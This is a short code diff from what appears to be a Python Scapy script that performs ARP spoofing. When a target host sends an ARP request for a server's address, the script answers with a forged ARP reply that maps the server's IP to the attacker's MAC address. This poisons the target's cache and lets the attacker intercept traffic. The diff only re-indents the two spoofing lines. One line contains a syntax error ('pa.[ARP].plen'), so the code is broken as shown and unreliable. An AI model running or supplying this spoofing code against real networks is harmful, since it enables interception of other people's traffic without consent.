@@ -25,8 +25,8 @@ def test(pa):
 	if pa.haslayer(ARP) is True:
 		if pa[ARP].psrc == victim and pa[ARP].pdst == server and pa[ARP].op == 1:
 			print(".", flush=True)
- 		pr = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa.[ARP].plen, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
- 		send(pr, verbose=False)
+			pr = Ether(src=myMAC, dst=victimMAC)/ARP(hwlen=pa[ARP].hwlen, plen=pa.[ARP].plen, op=2, hwsrc=myMAC, psrc=server, pdst=victim, hwdst=victimMAC)
+			send(pr, verbose=False)
 
 
 
